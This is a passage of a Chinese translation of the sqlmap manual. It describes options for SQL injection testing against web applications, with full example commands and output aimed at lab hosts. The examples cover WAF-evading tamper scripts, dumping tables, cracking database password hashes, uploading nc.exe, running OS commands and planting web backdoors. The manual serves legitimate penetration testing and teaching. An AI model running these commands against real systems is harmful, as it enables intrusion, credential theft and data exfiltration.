python sqlmap.py -u &quot;<a href="http://www.target.com/vuln.php" target="_blank">http://www.target.com/vuln.php</a>&quot; --data=&quot;query=foobar;id=1&quot; --param-del=&quot;;&quot; -f --banner --dbs --users</p>
<h3 id="http-cookie-">HTTP cookie头</h3>
<p>参数：--cookie,--load-cookies,--drop-set-cookie</p>
<p>这个参数在以下两个方面很有用：</p>
<p>1、web应用需要登陆的时候。</p>
<p>2、你想要在这些头参数中测试SQL注入时。</p>
<p>可以通过抓包把cookie获取到，复制出来，然后加到--cookie参数里。</p>
<p>在HTTP请求中，遇到Set-Cookie的话，sqlmap会自动获取并且在以后的请求中加入，并且会尝试SQL注入。</p>
<p>如果你不想接受Set-Cookie可以使用--drop-set-cookie参数来拒接。</p>
<p>当你使用--cookie参数时，当返回一个Set-Cookie头的时候，sqlmap会询问你用哪个cookie来继续接下来的请求。当--level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数。</p>
<h3 id="http-user-agent-">HTTP User-Agent头</h3>
<p>参数：--user-agent,--random-agent</p>
<p>默认情况下sqlmap的HTTP请求头中User-Agent值是：
sqlmap/1.0-dev-xxxxxxx (<a href="http://sqlmap.org" target="_blank">http://sqlmap.org</a>)</p>
<p>可以使用--user-anget参数来修改，同时也可以使用--random-agnet参数来随机的从./txt/user-agents.txt中获取。</p>
<p>当--level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入。</p>
<h3 id="http-referer-">HTTP Referer头</h3>
<p>参数：--referer</p>
<p>sqlmap可以在请求中伪造HTTP中的referer，当--level参数设定为3或者3以上的时候会尝试对referer注入。</p>
<h3 id="-http-">额外的HTTP头</h3>
<p>参数：--headers</p>
<p>可以通过--headers参数来增加额外的http头</p>
<h3 id="http-">HTTP认证保护</h3>
<p>参数：--auth-type,--auth-cred</p>
<p>这些参数可以用来登陆HTTP的认证保护支持三种方式：</p>
<p>1、Basic</p>
<p>2、Digest</p>
<p>3、NTLM</p>
<p>例子：
python sqlmap.py -u &quot;<a href="http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1" target="_blank">http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1</a>&quot; --auth-type Basic --auth-cred &quot;testuser:testpass&quot;</p>
<h3 id="http-">HTTP协议的证书认证</h3>
<p>参数：--auth-cert</p>
<p>当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file。</p>
<p>key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件。</p>
<h3 id="http-s-">HTTP(S)代理</h3>
<p>参数：--proxy,--proxy-cred和--ignore-proxy</p>
<p>使用--proxy代理是格式为：<a href="http://url:port。" target="_blank">http://url:port。</a></p>
<p>当HTTP(S)代理需要认证是可以使用--proxy-cred参数：username:password。</p>
<p>--ignore-proxy拒绝使用本地局域网的HTTP(S)代理。</p>
<h3 id="http-">HTTP请求延迟</h3>
<p>参数：--delay</p>
<p>可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</p>
<h3 id="-">设定超时时间</h3>
<p>参数：--timeout</p>
<p>可以设定一个HTTP(S)请求超过多久判定为超时，10.5表示10.5秒，默认是30秒。</p>
<h3 id="-">设定重试超时</h3>
<p>参数：--retries</p>
<p>当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。</p>
<h3 id="-">设定随机改变的参数值</h3>
<p>参数：--randomize</p>
<p>可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样。</p>
<h3 id="-">利用正则过滤目标网址</h3>
<p>参数：--scope</p>
<p>例如：
python sqlmap.py -l burp.log --scope=&quot;(www)?.target.(com|net|org)&quot;</p>
<h3 id="-">避免过多的错误请求被屏蔽</h3>
<p>参数：--safe-url,--safe-freq</p>
<p>有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。</p>
<p>绕过这个策略有两种方式：
1、--safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。 2、--safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。</p>
<h3 id="-url-">关掉URL参数值编码</h3>
<p>参数：--skip-urlencode</p>
<p>根据参数位置，他的值默认将会被URL编码，但是有些时候后端的web服务器不遵守RFC标准，只接受不经过URL编码的值，这时候就需要用--skip-urlencode参数。</p>
<h3 id="-python-">每次请求时候执行自定义的python代码</h3>
<p>参数：--eval</p>
<p>在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用--eval参数在每次请求时根据所写python代码做完修改后请求。</p>
<p>例子：
python sqlmap.py -u &quot;<a href="http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b" target="_blank">http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b</a>&quot; --eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;</p>
<p>上面的请求就是每次请求时根据id参数值，做一次md5后作为hash参数的值。</p>
<h2 id="-">注入</h2>
<h2 id="-">测试参数</h2>
<p>参数：-p,--skip</p>
<p>sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是你可以手动用-p参数设置想要测试的参数。例如： -p &quot;id,user-anget&quot;</p>
<p>当你使用--level的值很大但是有个别参数不想测试的时候可以使用--skip参数。</p>
<p>例如：--skip=&quot;user-angent.referer&quot;</p>
<p>在有些时候web服务器使用了URL重写，导致无法直接使用sqlmap测试参数，可以在想测试的参数后面加/*</p>
<p>例如：
python sqlmap.py -u &quot;<a href="http://targeturl/param1/value1/*/param2/value2/" target="_blank">http://targeturl/param1/value1/*/param2/value2/</a>&quot;</p>
<p>sqlmap将会测试value1的位置是否可注入。</p>
<h3 id="-">指定数据库</h3>
<p>参数：--dbms</p>
<p>默认情况系sqlmap会自动的探测web应用后端的数据库是什么，sqlmap支持的数据库有：
MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、SQLite、Firebird、Sybase、SAP MaxDB、DB2</p>
<h3 id="-">指定数据库服务器系统</h3>
<p>参数：--os</p>
<p>默认情况下sqlmap会自动的探测数据库服务器系统，支持的系统有：Linux、Windows。</p>
<h3 id="-">指定无效的大数字</h3>
<p>参数：--invalid-bignum</p>
<p>当你想指定一个报错的数值时，可以使用这个参数，例如默认情况系id=13，sqlmap会变成id=-13来报错，你可以指定比如id=9999999来报错。</p>
<h3 id="-">只定无效的逻辑</h3>
<p>参数：--invalid-logical</p>
<p>原因同上，可以指定id=13把原来的id=-13的报错改成id=13 AND 18=19。</p>
<h3 id="-payload">注入payload</h3>
<p>参数：--prefix,--suffix</p>
<p>在有些环境中，需要在注入的payload的前面或者后面加一些字符，来保证payload的正常执行。</p>
<p>例如，代码中是这样调用数据库的：
$query = &quot;SELECT /* FROM users WHERE id=(’&quot; . $_GET[’id’] . &quot;’) LIMIT 0, 1&quot;;</p>
<p>这时你就需要--prefix和--suffix参数了：</p>
<p>python sqlmap.py -u &quot;<a href="http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" target="_blank">http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1</a>&quot; -p id --prefix &quot;’)&quot; --suffix &quot;AND (’abc’=’abc&quot;</p>
<p>这样执行的SQL语句变成：</p>
<p>$query = &quot;SELECT /* FROM users WHERE id=(’1’) <PAYLOAD> AND (’abc’=’abc’) LIMIT 0, 1&quot;;</p>
<h3 id="-">修改注入的数据</h3>
<p>参数：--tamper</p>
<p>sqlmap除了使用CHAR()函数来防止出现单引号之外没有对注入的数据修改，你可以使用--tamper参数对数据做修改来绕过WAF等设备。</p>
<p>下面是一个tamper脚本的格式：
/# Needed imports from lib.core.enums import PRIORITY /# Define which is the order of application of tamper scripts against /# the payload <strong>priority</strong> = PRIORITY.NORMAL def tamper(payload):     &#39;&#39;&#39;     Description of your tamper script     &#39;&#39;&#39;     retVal = payload     /# your code to tamper the original payload     /# return the tampered payload     return retVal</p>
<p>可以查看 tamper/ 目录下的有哪些可用的脚本</p>
<p>例如：
$ python sqlmap.py -u &quot;<a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" target="_blank">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1</a>&quot; --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 [hh:mm:03] [DEBUG] cleaning up configuration parameters [hh:mm:03] [INFO] loading tamper script &#39;between&#39; [hh:mm:03] [INFO] loading tamper script &#39;randomcase&#39; [hh:mm:03] [INFO] loading tamper script &#39;space2comment&#39; [...] [hh:mm:04] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause&#39; [hh:mm:04] [PAYLOAD] 1)//<em>/</em>/And//<em>/</em>/1369=7706//<em>/</em>/And//<em>/</em>/(4092=4092 [hh:mm:04] [PAYLOAD] 1)//<em>/</em>/AND//<em>/</em>/9267=9267//<em>/</em>/AND//<em>/</em>/(4057=4057 [hh:mm:04] [PAYLOAD] 1//<em>/</em>/AnD//<em>/</em>/950=7041 [...] [hh:mm:04] [INFO] testing &#39;MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause&#39; [hh:mm:04] [PAYLOAD] 1//<em>/</em>/anD//<em>/</em>/(SELeCt//<em>/</em>/9921//<em>/</em>/fROm(SELeCt//<em>/</em>/counT(/<em>),CONCAT(cHar( 58,117,113,107,58),(SELeCt//</em>/<em>/(case//</em>/<em>/whEN//</em>/<em>/(9921=9921)//</em>/<em>/THeN//</em>/<em>/1//</em>/<em>/elsE//</em>/<em>/0//</em>/<em>/ ENd)),cHar(58,106,104,104,58),FLOOR(RanD(0)/</em>2))x//<em>/</em>/fROm//<em>/</em>/information_schema.tables//<em>/</em>/ group//<em>/</em>/bY//<em>/</em>/x)a) [hh:mm:04] [INFO] GET parameter &#39;id&#39; is &#39;MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause&#39; injectable [...]</p>
<h2 id="-">探测</h2>
<h3 id="-">探测等级</h3>
<p>参数：--level</p>
<p>共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。</p>
<p>这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent/Referer头在level为3的时候就会测试。</p>
<p>总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。</p>
<h3 id="-">风险等级</h3>
<p>参数：--risk</p>
<p>共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。</p>
<p>在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。</p>
<p>测试的语句同样可以在xml/payloads.xml中找到，你也可以自行添加payload。</p>
<h3 id="-">页面比较</h3>
<p>参数：--string,--not-string,--regexp,--code</p>
<p>默认情况下sqlmap通过判断返回页面的不同来判断真假，但有时候这会产生误差，因为有的页面在每次刷新的时候都会返回不同的代码，比如页面当中包含一个动态的广告或者其他内容，这会导致sqlmap的误判。此时用户可以提供一个字符串或者一段正则匹配，在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用--string参数添加字符串，--regexp添加正则），同时用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（--not-string添加）。用户也可以提供真与假条件返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，可以添加参数--code=200。</p>
<p>参数：--text-only,--titles</p>
<p>有些时候用户知道真条件下的返回页面与假条件下返回页面是不同位置在哪里可以使用--text-only（HTTP响应体中不同）--titles（HTML的title标签中不同）。</p>
<h2 id="-">注入技术</h2>
<h3 id="-">测试是否是注入</h3>
<p>参数：--technique</p>
<p>这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。</p>
<p>支持的探测方式如下：
B: Boolean-based blind SQL injection（布尔型注入） E: Error-based SQL injection（报错型注入） U: UNION query SQL injection（可联合查询注入） S: Stacked queries SQL injection（可多语句查询注入） T: Time-based blind SQL injection（基于时间延迟注入）</p>
<h3 id="-">设定延迟注入的时间</h3>
<p>参数：--time-sec</p>
<p>当使用继续时间的盲注时，时刻使用--time-sec参数设定延时时间，默认是5秒。</p>
<h3 id="-union-">设定UNION查询字段数</h3>
<p>参数：--union-cols</p>
<p>默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当--level为5的时候他会增加测试到50个字段数。设定--union-cols的值应该是一段整数，如：12-16，是测试12-16个字段数。</p>
<h3 id="-union-">设定UNION查询使用的字符</h3>
<p>参数：--union-char</p>
<p>默认情况下sqlmap针对UNION查询的注入会使用NULL字符，但是有些情况下会造成页面返回失败，而一个随机整数是成功的，这是你可以用--union-char只定UNION查询的字符。</p>
<h3 id="-sql-">二阶SQL注入</h3>
<p>参数：--second-order</p>
<p>有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。--second-order后门跟一个判断页面的URL地址。</p>
<h2 id="-">列数据</h2>
<h3 id="-">标志</h3>
<p>参数：-b,--banner</p>
<p>大多数的数据库系统都有一个函数可以返回数据库的版本号，通常这个函数是version()或者变量@@version这主要取决与是什么数据库。</p>
<h3 id="-">用户</h3>
<p>参数：-current-user</p>
<p>在大多数据库中可以获取到管理数据的用户。</p>
<h3 id="-">当前数据库</h3>
<p>参数：--current-db</p>
<p>返还当前连接的数据库。</p>
<h3 id="-">当前用户是否为管理用</h3>
<p>参数：--is-dba</p>
<p>判断当前的用户是否为管理，是的话会返回True。</p>
<h3 id="-">列数据库管理用户</h3>
<p>参数：--users</p>
<p>当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。</p>
<h3 id="-hash">列出并破解数据库用户的hash</h3>
<p>参数：--passwords</p>
<p>当前用户有权限读取包含用户密码的彪的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。</p>
<p>例子：
$ python sqlmap.py -u &quot;<a href="http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" target="_blank">http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1</a>&quot; --passwords -v 1 [...] back-end DBMS: PostgreSQL [hh:mm:38] [INFO] fetching database users password hashes do you want to use dictionary attack on retrieved password hashes? [Y/n/q] y [hh:mm:42] [INFO] using hash method: &#39;postgres_passwd&#39; what&#39;s the dictionary&#39;s location? [/software/sqlmap/txt/wordlist.txt] [hh:mm:46] [INFO] loading dictionary from: &#39;/software/sqlmap/txt/wordlist.txt&#39; do you want to use common password suffixes? (slow!) [y/N] n [hh:mm:48] [INFO] starting dictionary attack (postgres_passwd) [hh:mm:49] [INFO] found: &#39;testpass&#39; for user: &#39;testuser&#39; [hh:mm:50] [INFO] found: &#39;testpass&#39; for user: &#39;postgres&#39; database management system users password hashes: [/<em>] postgres [1]:     password hash: md5d7d880f96044b72d0bba108ace96d1e4     clear-text password: testpass [/</em>] testuser [1]:     password hash: md599e5ea7a6f7c3269995cba3927fd0093     clear-text password: testpass</p>
<p>可以看到sqlmap不仅勒出数据库的用户跟密码，同时也识别出是PostgreSQL数据库，并询问用户是否采用字典爆破的方式进行破解，这个爆破已经支持Oracle和Microsoft SQL Server。</p>
<p>也可以提供-U参数来指定爆破哪个用户的hash。</p>
<h3 id="-">列出数据库管理员权限</h3>
<p>参数：--privileges</p>
<p>当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap将会告诉你哪个是数据库的超级管理员。也可以用-U参数指定你想看哪个用户的权限。</p>
<h3 id="-">列出数据库管理员角色</h3>
<p>参数：--roles</p>
<p>当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的角色，也可以用-U参数指定你想看哪个用户的角色。</p>
<p>仅适用于当前数据库是Oracle的时候。</p>
<h3 id="-">列出数据库系统的数据库</h3>
<p>参数：--dbs</p>
<p>当前用户有权限读取包含所有数据库列表信息的表中的时候，即可列出所有的数据库。</p>
<h3 id="-">列举数据库表</h3>
<p>参数：--tables,--exclude-sysdbs,-D</p>
<p>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。</p>
<p>如果你不提供-D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。</p>
<p>--exclude-sysdbs参数是指包含了所有的系统数据库。</p>
<p>需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。</p>
<h3 id="-">列举数据库表中的字段</h3>
<p>参数：--columns,-C,-T,-D</p>
<p>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。</p>
<p>如果没有使用-D参数指定数据库时，默认会使用当前数据库。</p>
<p>列举一个SQLite的例子：
$ python sqlmap.py -u &quot;<a href="http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1" target="_blank">http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1</a>&quot; --columns -D testdb -T users -C name [...] Database: SQLite_masterdb Table: users [3 columns] +---------+---------+ | Column  | Type    | +---------+---------+ | id      | INTEGER | | name    | TEXT    | | surname | TEXT    | +---------+---------+</p>
<h3 id="-">列举数据库系统的架构</h3>
<p>参数：--schema,--exclude-sysdbs</p>
<p>用户可以用此参数获取数据库的架构，包含所有的数据库，表和字段，以及各自的类型。</p>
<p>加上--exclude-sysdbs参数，将不会获取数据库自带的系统库内容。</p>
<p>MySQL例子：
$ python sqlmap.py -u &quot;<a href="http://192.168.48.130/sqlmap/mysql/get_int.php?id=1" target="_blank">http://192.168.48.130/sqlmap/mysql/get_int.php?id=1</a>&quot; --schema --batch --exclude-sysdbs [...] Database: owasp10 Table: accounts [4 columns] +-------------+---------+ | Column      | Type    | +-------------+---------+ | cid         | int(11) | | mysignature | text    | | password    | text    | | username    | text    | +-------------+---------+ Database: owasp10 Table: blogs_table [4 columns] +--------------+----------+ | Column       | Type     | +--------------+----------+ | date         | datetime | | blogger_name | text     | | cid          | int(11)  | | comment      | text     | +--------------+----------+ Database: owasp10 Table: hitlog [6 columns] +----------+----------+ | Column   | Type     | +----------+----------+ | date     | datetime | | browser  | text     | | cid      | int(11)  | | hostname | text     | | ip       | text     | | referer  | text     | +----------+----------+ Database: testdb Table: users [3 columns] +---------+---------------+ | Column  | Type          | +---------+---------------+ | id      | int(11)       | | name    | varchar(500)  | | surname | varchar(1000) | +---------+---------------+ [...]</p>
<h3 id="-">获取表中数据个数</h3>
<p>参数：--count</p>
<p>有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数。</p>
<p>列举一个Microsoft SQL Server例子：
$ python sqlmap.py -u &quot;<a href="http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1" target="_blank">http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1</a>&quot; --count -D testdb [...] Database: testdb +----------------+---------+ | Table          | Entries | +----------------+---------+ | dbo.users      | 4       | | dbo.users_blob | 2       | +----------------+---------+</p>
<h3 id="-">获取整个表的数据</h3>
<p>参数：--dump,-C,-T,-D,--start,--stop,--first,--last</p>
<p>如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取真个表的所有内容。</p>
<p>使用-D,-T参数指定想要获取哪个库的哪个表，不适用-D参数时，默认使用当前库。</p>
<p>列举一个Firebird的例子：
$ python sqlmap.py -u &quot;<a href="http://192.168.136.131/sqlmap/firebird/get_int.php?id=1" target="_blank">http://192.168.136.131/sqlmap/firebird/get_int.php?id=1</a>&quot; --dump -T users [...] Database: Firebird_masterdb Table: USERS [4 entries] +----+--------+------------+ | ID | NAME   | SURNAME    | +----+--------+------------+ | 1  | luther | blisset    | | 2  | fluffy | bunny      | | 3  | wu     | ming       | | 4  | NULL   | nameisnull | +----+--------+------------+</p>
<p>可以获取指定库中的所有表的内容，只用-dump跟-D参数（不使用-T与-C参数）。</p>
<p>也可以用-dump跟-C获取指定的字段内容。</p>
<p>sqlmap为每个表生成了一个CSV文件。</p>
<p>如果你只想获取一段数据，可以使用--start和--stop参数，例如，你只想获取第一段数据可hi使用--stop 1，如果想获取第二段与第三段数据，使用参数 --start 1 --stop 3。</p>
<p>也可以用--first与--last参数，获取第几个字符到第几个字符的内容，如果你想获取字段中地三个字符到第五个字符的内容，使用--first 3 --last 5，只在盲注的时候使用，因为其他方式可以准确的获取注入内容，不需要一个字符一个字符的猜解。</p>
<h3 id="-">获取所有数据库表的内容</h3>
<p>参数：--dump-all,--exclude-sysdbs</p>
<p>使用--dump-all参数获取所有数据库表的内容，可同时加上--exclude-sysdbs只获取用户数据库的表，需要注意在Microsoft SQL Server中master数据库没有考虑成为一个系统数据库，因为有的管理员会把他当初用户数据库一样来使用它。</p>
<h3 id="-">搜索字段，表，数据库</h3>
<p>参数：--search,-C,-T,-D</p>
<p>--search可以用来寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段。</p>
<p>可以在一下三种情况下使用：
-C后跟着用逗号分割的列名，将会在所有数据库表中搜索指定的列名。 -T后跟着用逗号分割的表名，将会在所有数据库中搜索指定的表名 -D后跟着用逗号分割的库名，将会在所有数据库中搜索指定的库名。</p>
<h3 id="-sql-">运行自定义的SQL语句</h3>
<p>参数：--sql-query,--sql-shell</p>
<p>sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语句。</p>
<p>如果是SELECT查询语句，sqlap将会输出结果。如果是通过SQL注入执行其他语句，需要测试是否支持多语句执行SQL语句。</p>
<p>列举一个Mircrosoft SQL Server 2000的例子：
$ python sqlmap.py -u &quot;<a href="http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" target="_blank">http://192.168.136.131/sqlmap/mssql/get_int.php?id=1</a>&quot; --sql-query &quot;SELECT &#39;foo&#39;&quot; -v 1 [...] [hh:mm:14] [INFO] fetching SQL SELECT query output: &#39;SELECT &#39;foo&#39;&#39; [hh:mm:14] [INFO] retrieved: foo SELECT &#39;foo&#39;:    &#39;foo&#39; $ python sqlmap.py -u &quot;<a href="http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" target="_blank">http://192.168.136.131/sqlmap/mssql/get_int.php?id=1</a>&quot; --sql-query &quot;SELECT &#39;foo&#39;, &#39;bar&#39;&quot; -v 2 [...] [hh:mm:50] [INFO] fetching SQL SELECT query output: &#39;SELECT &#39;foo&#39;, &#39;bar&#39;&#39; [hh:mm:50] [INFO] the SQL query provided has more than a field. sqlmap will now unpack it into distinct queries to be able to retrieve the output even if we are going blind [hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) AS VARCHAR(8000)), (CHAR(32))) [hh:mm:50] [INFO] retrieved: foo [hh:mm:50] [DEBUG] performed 27 queries in 0 seconds [hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(98)+CHAR(97)+CHAR(114)) AS VARCHAR(8000)), (CHAR(32))) [hh:mm:50] [INFO] retrieved: bar [hh:mm:50] [DEBUG] performed 27 queries in 0 seconds SELECT &#39;foo&#39;, &#39;bar&#39;:    &#39;foo, bar&#39;</p>
<h2 id="-">爆破</h2>
<h3 id="-">暴力破解表名</h3>
<p>参数：--common-tables</p>
<p>当使用--tables无法获取到数据库的表时，可以使用此参数。</p>
<p>通常是如下情况：
1、MySQL数据库版本小于5.0，没有information_schema表。 2、数据库是Microssoft Access，系统表MSysObjects是不可读的（默认）。 3、当前用户没有权限读取系统中保存数据结构的表的权限。</p>
<p>暴力破解的表在txt/common-tables.txt文件中，你可以自己添加。</p>
<p>列举一个MySQL 4.1的例子：
$ python sqlmap.py -u &quot;<a href="http://192.168.136.129/mysql/get_int_4.php?id=1" target="_blank">http://192.168.136.129/mysql/get_int_4.php?id=1</a>&quot; --common-tables -D testdb --banner [...] [hh:mm:39] [INFO] testing MySQL [hh:mm:39] [INFO] confirming MySQL [hh:mm:40] [INFO] the back-end DBMS is MySQL [hh:mm:40] [INFO] fetching banner web server operating system: Windows web application technology: PHP 5.3.1, Apache 2.2.14 back-end DBMS operating system: Windows back-end DBMS: MySQL &lt; 5.0.0 banner:    &#39;4.1.21-community-nt&#39; [hh:mm:40] [INFO] checking table existence using items from &#39;/software/sqlmap/txt/common-tables.txt&#39; [hh:mm:40] [INFO] adding words used on web page to the check list please enter number of threads? [Enter for 1 (current)] 8 [hh:mm:43] [INFO] retrieved: users Database: testdb [1 table] +-------+ | users | +-------+</p>
<h3 id="-">暴力破解列名</h3>
<p>参数：--common-columns</p>
<p>与暴力破解表名一样，暴力跑的列名在txt/common-columns.txt中。</p>
<h2 id="-">用户自定义函数注入</h2>
<p>参数：--udf-inject,--shared-lib</p>
<p>你可以通过编译MySQL注入你自定义的函数（UDFs）或PostgreSQL在windows中共享库，DLL，或者Linux/Unix中共享对象，sqlmap将会问你一些问题，上传到服务器数据库自定义函数，然后根据你的选择执行他们，当你注入完成后，sqlmap将会移除它们。</p>
<h2 id="-">系统文件操作</h2>
<h3 id="-">从数据库服务器中读取文件</h3>
<p>参数：--file-read</p>
<p>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。</p>
<p>列举一个Microsoft SQL Server 2005的例子：
$ python sqlmap.py -u &quot;<a href="http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther" target="_blank">http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther</a>&quot; \ --file-read &quot;C:/example.exe&quot; -v 1 [...] [hh:mm:49] [INFO] the back-end DBMS is Microsoft SQL Server web server operating system: Windows 2000 web application technology: ASP.NET, Microsoft IIS 6.0, ASP back-end DBMS: Microsoft SQL Server 2005 [hh:mm:50] [INFO] fetching file: &#39;C:/example.exe&#39; [hh:mm:50] [INFO] the SQL query provided returns 3 entries C:/example.exe file saved to:    &#39;/software/sqlmap/output/192.168.136.129/files/C<strong>example.exe&#39; [...] $ ls -l output/192.168.136.129/files/C</strong>example.exe -rw-r--r-- 1 inquis inquis 2560 2011-MM-DD hh:mm output/192.168.136.129/files/C<strong>example.exe $ file output/192.168.136.129/files/C</strong>example.exe output/192.168.136.129/files/C__example.exe: PE32 executable for MS Windows (GUI) Intel 80386 32-bit</p>
<h3 id="-">把文件上传到数据库服务器中</h3>
<p>参数：--file-write,--file-dest</p>
<p>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。</p>
<p>列举一个MySQL的例子：
$ file /software/nc.exe.packed /software/nc.exe.packed: PE32 executable for MS Windows (console) Intel 80386 32-bit $ ls -l /software/nc.exe.packed -rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /software/nc.exe.packed $ python sqlmap.py -u &quot;<a href="http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1" target="_blank">http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1</a>&quot; --file-write \ &quot;/software/nc.exe.packed&quot; --file-dest &quot;C:/WINDOWS/Temp/nc.exe&quot; -v 1 [...] [hh:mm:29] [INFO] the back-end DBMS is MySQL web server operating system: Windows 2003 or 2008 web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727 back-end DBMS: MySQL &gt;= 5.0.0 [...] do you want confirmation that the file &#39;C:/WINDOWS/Temp/nc.exe&#39; has been successfully written on the back-end DBMS file system? [Y/n] y [hh:mm:52] [INFO] retrieved: 31744 [hh:mm:52] [INFO] the file has been successfully written and its size is 31744 bytes, same size as the local file &#39;/software/nc.exe.packed&#39;</p>
<h3 id="-">运行任意操作系统命令</h3>
<p>参数：--os-cmd,--os-shell</p>
<p>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。</p>
<p>在MySQL、PostgreSQL，sqlmap上传一个二进制库，包含用户自定义的函数，sys_exec()和sys_eval()。</p>
<p>那么他创建的这两个函数可以执行系统命令。在Microsoft SQL Server，sqlmap将会使用xp_cmdshell存储过程，如果被禁（在Microsoft SQL Server 2005及以上版本默认禁制），sqlmap会重新启用它，如果不存在，会自动创建。</p>
<p>列举一个PostgreSQL的例子：
$ python sqlmap.py -u &quot;<a href="http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" target="_blank">http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1</a>&quot; \ --os-cmd id -v 1 [...] web application technology: PHP 5.2.6, Apache 2.2.9 back-end DBMS: PostgreSQL [hh:mm:12] [INFO] fingerprinting the back-end DBMS operating system [hh:mm:12] [INFO] the back-end DBMS operating system is Linux [hh:mm:12] [INFO] testing if current user is DBA [hh:mm:12] [INFO] detecting back-end DBMS version from its banner [hh:mm:12] [INFO] checking if UDF &#39;sys_eval&#39; already exist [hh:mm:12] [INFO] checking if UDF &#39;sys_exec&#39; already exist [hh:mm:12] [INFO] creating UDF &#39;sys_eval&#39; from the binary UDF file [hh:mm:12] [INFO] creating UDF &#39;sys_exec&#39; from the binary UDF file do you want to retrieve the command standard output? [Y/n/a] y command standard output:    &#39;uid=104(postgres) gid=106(postgres) groups=106(postgres)&#39; [hh:mm:19] [INFO] cleaning up the database management system do you want to remove UDF &#39;sys_eval&#39;? [Y/n] y do you want to remove UDF &#39;sys_exec&#39;? [Y/n] y [hh:mm:23] [INFO] database management system cleanup finished [hh:mm:23] [WARNING] remember that UDF shared object files saved on the file system can only be deleted manually</p>
<p>用--os-shell参数也可以模拟一个真实的shell，可以输入你想执行的命令。</p>
<p>当不能执行多语句的时候（比如php或者asp的后端数据库为MySQL时），仍然可能使用INTO OUTFILE写进可写目录，来创建一个web后门。支持的语言：
1、ASP 2、ASP.NET 3、JSP 4、PHP</p>
<h3 id="meterpreter-">Meterpreter配合使用</h3>
